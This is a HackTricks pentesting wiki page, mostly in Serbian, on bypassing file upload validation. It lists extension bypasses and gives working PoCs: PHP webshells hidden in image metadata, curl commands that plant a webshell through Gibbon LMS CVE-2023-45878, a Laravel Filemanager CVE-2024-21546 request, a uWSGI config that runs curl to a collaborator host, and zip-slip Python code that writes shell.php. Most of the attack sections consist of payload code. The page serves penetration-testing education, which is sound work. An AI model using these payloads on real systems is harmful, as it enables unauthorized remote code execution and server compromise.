# Otpremanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za otpremanje fajlova

Ostale korisne ekstenzije:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Rad u PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provere ekstenzija fajlova

1. Ako važe, **proverite** **prethodne ekstenzije.** Takođe testirajte koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanje validne ekstenzije pre** izvršne ekstenzije (koristite i prethodne ekstenzije):_
- _file.png.php_
- _file.png.Php5_
3. Pokušajte dodati **specijalne karaktere na kraju.** Možete koristiti Burp da **bruteforce**-ujete sve **ascii** i **Unicode** karaktere. (_Napomena: možete takođe pokušati koristiti **prethodno** pomenute **ekstenzije**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušajte zaobići zaštite **obmanjujući parser ekstenzija** na server strani tehnikama kao što su **dupliranje** **ekstenzije** ili **dodavanje smeća** (**)null** bajtova) između ekstenzija. _Takođe možete koristiti **prethodne ekstenzije** da pripremite bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodajte **još jedan sloj ekstenzija** na prethodnu proveru:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušajte staviti **exec extension before the valid extension** pre validne ekstenzije i nadate se da je server pogrešno konfigurisan. (korisno za eksploatisanje Apache pogrešne konfiguracije gde će sve što ima ekstenziju **_.php_** (ali ne mora nužno da se završava sa .php) izvršiti kod):
- _ex: file.php.png_
7. Korišćenje **NTFS alternate data stream (ADS)** u **Windows**. U ovom slučaju, karakter dvotačke ":" će biti umetnut posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, biće kreiran **prazan fajl sa zabranjenom ekstenzijom** na serveru (npr. "file.asax:.jpg"). Ovaj fajl može biti kasnije izmenjen drugim tehnikama kao što je korišćenje njegovog short filename. Pattern "**::$data**” se takođe može koristiti za kreiranje ne-praznih fajlova. Dakle, dodavanje tačke nakon ovog pattern-a može biti korisno za zaobilaženje daljih restrikcija (npr. "file.asp::$data.")
8. Pokušajte prekoračiti ograničenje dužine imena fajla. Validna ekstenzija se odseče. A maliciozni PHP ostaje. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. završna tačka) – CVE-2024-21546

Neki upload handleri skraćuju ili normalizuju završne tačke u sačuvanom imenu fajla. U UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) verzijama pre 2.9.1, možete zaobići validaciju ekstenzije tako što ćete:

- Koristiti validan image MIME i magic header (npr. PNG-ov `\x89PNG\r\n\x1a\n`).
- Imenovati otpremljeni fajl sa PHP ekstenzijom praćenom tačkom, npr. `shell.php.`.
- Server skida završnu tačku i sačuva `shell.php`, koji će se izvršiti ako se smesti u web-servirani direktorijum (podrazumevana public storage kao `/storage/files/`).

Minimalni PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Zatim pristupite sačuvanoj putanji (tipično u Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Zaobilaženje Content-Type, Magic Number, Compression & Resizing

- Zaobiđite **Content-Type** provere tako što ćete vrednost **Content-Type** **header**-a postaviti na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobiđite proveru **magic number** tako što ćete na početak fajla dodati **bytes of a real image** (zavarajte _file_ komandu). Ili ubacite shell unutar **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili možete direktno **ubaciti payload** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se na vašu sliku primenjuje **compression**, na primer korišćenjem standardnih PHP biblioteka kao što je [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike možda neće biti korisne. Međutim, možete koristiti **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web stranica takođe može da **resizuje** **image**, koristeći na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Ipak, možete iskoristiti **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika za pravljenje payload-a koji **preživi image resizing**, koristeći PHP-GD funkciju `thumbnailImage`. Takođe možete iskoristiti **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Pronađite ranjivost koja dopušta **rename** već uploadovanog fajla (da promenite ekstenziju).
- Pronađite **Local File Inclusion** ranjivost da izvršite backdoor.
- **Possible Information disclosure**:
1. Uploadujte **više puta** (i u **isti trenutak**) **isti fajl** sa **istim imenom**
2. Uploadujte fajl sa **imenom** fajla ili foldera koji već postoji
3. Upload fajla sa imenom `"." , "..", or "…"` . Na primer, u Apache na **Windows**, ako aplikacija čuva uploadovane fajlove u "/www/uploads/" direktorijumu, fajl sa imenom "." će kreirati fajl nazvan
uploads” u "/www/" direktorijumu.
4. Upload fajla koji možda nije lako izbrisati, kao što je **"…:.jpg"** na **NTFS**. (Windows)
5. Upload fajla na **Windows** sa **invalidnim karakterima** kao što su `|<>*?”` u imenu. (Windows)
6. Upload fajla na **Windows** koristeći **reserved** (**forbidden**) **names** kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Pokušajte i da **uploadujete izvršni fajl** (.exe) ili **.html** (manje sumnjivo) koji će **izvršavati kod** kada ga žrtva slučajno otvori.

### Special extension tricks

Ako pokušavate da uploadujete fajlove na **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavate da uploadujete fajlove na **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Fajlovi sa ekstenzijom `.phar` su kao `.jar` za java, ali za php, i mogu biti **korišćeni kao php fajl** (izvršavanje sa php, ili uključivanje unutar skripta...)

Ekstenzija `.inc` se ponekad koristi za php fajlove koji služe samo za **import fajlova**, pa bi u nekom trenutku neko mogao dozvoliti **izvršavanje te ekstenzije**.

## **Jetty RCE**

Ako možete uploadovati XML fajl na Jetty server, možete dobiti [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Kao što je prikazano na sledećoj slici, uploadujte XML fajl u `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Za detaljnu analizu ove ranjivosti pogledajte originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ranjivosti mogu se iskoristiti na uWSGI serverima ako napadač ima mogućnost da izmeni `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifičnu sintaksu za uključivanje "magic" varijabli, placeholders i operatora. Konkretno, '@' operator, korišćen kao `@(filename)`, dizajniran je da uključi sadržaj fajla. Među različitim podržanim scheme-ima u uWSGI, "exec" scheme je posebno moćna, omogućavajući čitanje podataka iz standardnog output-a procesa. Ova funkcionalnost može biti zloupotrebljena za zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se `.ini` konfiguracioni fajl procesuira.

Razmotrite sledeći primer štetnog `uwsgi.ini` fajla, koji prikazuje različite scheme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršenje payload-a se dešava tokom parsiranja konfiguracione datoteke. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (potencijalno nakon crash-a ili zbog Denial of Service attack) ili datoteka mora biti podešena na auto-reload. Auto-reload feature, ako je omogućena, ponovo učitava datoteku u zadatim intervalima pri detekciji promena.

Ključno je razumeti labavu prirodu parsiranja konfiguracione datoteke uWSGI-ja. Konkretno, pomenuti payload može biti umetnut u binary file (kao što je image ili PDF), što dodatno širi obim potencijalne eksploatacije.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Neautentifikovani endpoint u Gibbon LMS omogućava arbitrary file write unutar web root-a, što dovodi do pre-auth RCE stavljanjem PHP datoteke. Vulnerable verzije: do i uključujući 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Metod: POST
- Potrebni parametri:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignoriše type/name, base64-dekodujući zadnji deo)
- `path`: destination filename relative to Gibbon install dir (npr. `poc.php` ili `0xdf.php`)
- `gibbonPersonID`: bilo koja neprazna vrednost je prihvaćena (npr. `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Postavite minimalni webshell i izvršite komande:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- Handler izvršava `base64_decode($_POST["img"])` nakon što podeli po `;` i `,`, zatim upisuje bajtove u `$absolutePath . '/' . $_POST['path']` bez validacije ekstenzije/tipa.
- Nastali kod se izvršava kao korisnik web servisa (npr. XAMPP Apache na Windows).

Reference za ovaj bug uključuju usd HeroLab advisory i NVD entry. Pogledajte sekciju References ispod.

## **wget File Upload/SSRF Trick**

Ponekad možete naići na server koji koristi **`wget`** za **download files** i gde možete **indicate** **the URL**. U tim slučajevima, kod može proveravati da li je ekstenzija preuzetih fajlova u whitelist kako bi osigurao da će se preuzimati samo dozvoljeni fajlovi. Međutim, **this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### Zaobilaženje upload direktorijuma pomoću NTFS junctions (Windows)

(Za ovaj attack biće vam potreban lokalni pristup Windows mašini) Kada se uploads čuvaju u per-user podfolderima na Windows (npr., C:\Windows\Tasks\Uploads\<id>\) i vi kontrolišete kreiranje/brisanje tog podfoldera, možete ga zameniti directory junction‑om koji pokazuje na osetljivu lokaciju (npr., webroot). Naredni uploads biće zapisani u ciljni path, omogućavajući code execution ako cilj interpretira server‑side code.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Napomene
- mklink /J creates an NTFS directory junction (reparse point). Nalog web servera mora da prati junction i da ima write permission u destinaciji.
- Ovo preusmerava arbitrary file writes; ako destinacija izvršava skripte (PHP/ASP), ovo postaje RCE.
- Odbrane: ne dozvolite writable upload roots da budu attacker‑controllable pod C:\Windows\Tasks ili slično; blokirajte junction creation; validate extensions server‑side; čuvajte upload‑ove na odvojenom volumenu ili sa deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Some upload/ingest handlers write the raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s webapps).

Generički tok eksploatacije:
- Pripremite svoj server-side payload (npr. minimalni JSP webshell) i gzip-compress bajtove.
- Pošaljite POST gde path parameter (npr. token) sadrži traversal koji izlazi iz predviđenog foldera, a file označava ime fajla za upis. Postavite Content-Type: application/octet-stream i Content-Encoding: gzip; body je compressed payload.
- Posetite upisani fajl da biste pokrenuli izvršavanje.

Ilustrativan zahtev:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Zatim pokreni:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Beleške
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite’s Hackvertor extension can produce a correct gzip body from your payload.
- This is a pure pre-auth arbitrary file write → RCE pattern; it does not rely on multipart parsing.

Mitigacije
- Određujte destinacije za upload na serverskoj strani; nikada ne verujte fragmentima putanje koje šalju klijenti.
- Kanonično rešavajte putanje i osigurajte da rešeni put ostane unutar dozvoljenog (allow-listed) osnovnog direktorijuma.
- Skladištite upload-ove na neizvršnom volumenu i onemogućite izvršavanje skripti iz zapisivih putanja.

## Alati

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) je moćan alat dizajniran da pomogne Pentesters i Bug Hunters u testiranju mehanizama za upload fajlova. Koristi razne bug bounty tehnike da pojednostavi proces identifikovanja i iskorišćavanja ranjivosti, obezbeđujući temeljne procene web aplikacija.

### Corrupting upload indices with snprintf quirks (historical)

Neki legacy upload handler-i koji koriste `snprintf()` ili slične funkcije da izgrade multi-file nizove iz single-file uploada mogu biti prevareni da falsifikuju `_FILES` strukturu. Zbog nekonzistentnosti i truncation u ponašanju `snprintf()`, pažljivo konstruisan single upload može izgledati kao više indeksiranih fajlova na serverskoj strani, zbunjujući logiku koja pretpostavlja striktan oblik (npr. tretira ga kao multi-file upload i ulazi u unsafe grane). Iako danas nišan, ovaj “index corruption” obrazac povremeno se pojavljuje u CTF-ovima i starijim kodbazama.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Evo top 10 liste stvari koje možete postići upload-ovanjem (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magični header bajtovi

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Otpremite arhivu koja sadrži soft links ka drugim fajlovima; kada pristupite dekompresovanim fajlovima, pristupićete linkovanim fajlovima:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Raspakivanje u različite direktorijume

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Uprkos početnim pretpostavkama da ova konfiguracija može zaštititi od OS-level command execution kroz malicious file uploads, hijerarhijska podrška za kompresiju i directory traversal mogućnosti ZIP archive format-a mogu biti iskorišćene. To omogućava napadačima da zaobiđu ograničenja i pobegnu iz sigurnih upload direktorijuma manipulišući decompression funkcionalnošću ciljne aplikacije.

Automatizovani exploit za kreiranje takvih fajlova je dostupan na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **symlink trick with evilarc** je opcija. Ako je cilj da se pristupi fajlu poput `/flag.txt`, treba napraviti symlink ka tom fajlu na vašem sistemu. Ovo osigurava da evilarc ne naiđe na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje zlonamernog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

For further details **proverite originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kod se piše da izvršava komande prosleđene preko `$_REQUEST` promenljive.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Kreira se više fajlova i pravi se zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Imena fajlova unutar zip-a se menjaju koristeći vi ili hex editor, zamenjujući "xxA" sa "../" da bi se izvršila traversala direktorijuma.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Kada backend validira ZIP unose koristeći PHP’s ZipArchive, ali ekstrakcija zapisuje na filesystem koristeći raw imena, možete smugglovati nedozvoljenu ekstenziju ubacivanjem NUL (0x00) u polja imena fajla. ZipArchive tretira entry name kao C‑string i prekida na prvom NUL; filesystem upisuje puno ime, zanemarujući sve posle NUL-a.

Osnovni tok:
- Pripremite legitimni container fajl (npr. validan PDF) koji ubacuje mali PHP stub u stream tako da magic/MIME ostane PDF.
- Nazovite ga kao `shell.php..pdf`, zip-ujte ga, zatim hex‑editujte ZIP local header i central directory filename da zamenite prvu `.` posle `.php` sa `0x00`, što rezultira `shell.php\x00.pdf`.
- Validators koji se oslanjaju na ZipArchive će “videti” `shell.php .pdf` i dozvoliti ga; extractor upisuje `shell.php` na disk, što vodi do RCE ako je upload folder izvršan.

Minimalni PoC koraci:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Notes
- Promenite OBE pojave imena fajla (lokalno i u central directory). Neki alati dodaju i dodatni data descriptor unos — prilagodite sva polja imena ako postoje.
- Payload fajl i dalje mora proći server‑side magic/MIME sniffing. Ugradnja PHP-a u PDF stream održava header važećim.
- Funkcioniše u situacijama kada se enum/validation path i extraction/write path ne slažu oko rukovanja stringovima.

### Složeni/konkatenirani ZIPs (neslaganje parsera)

Spajanje dve validne ZIP datoteke stvara blob u kome se različiti parseri fokusiraju na različite EOCD zapise. Mnogi alati lociraju poslednji End Of Central Directory (EOCD), dok neke biblioteke (npr. ZipArchive u određenim tokovima rada) mogu parsirati prvu arhivu koju pronađu. Ako validacija nabraja prvu arhivu, a ekstrakcija koristi drugi alat koji poštuje poslednji EOCD, bezopasna arhiva može proći provere dok zlonamerna bude ekstrahovana.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Šablon zloupotrebe
- Kreirajte benigni arhiv (dozvoljen tip, npr. PDF) i drugi arhiv koji sadrži blokiranu ekstenziju (npr. `shell.php`).
- Spojite ih: `cat benign.zip evil.zip > combined.zip`.
- Ako server validira pomoću jednog parsera (vidi benign.zip) ali ekstrahuje pomoću drugog (procesira evil.zip), blokirana datoteka završi u putanji za ekstrakciju.

## ImageTragic

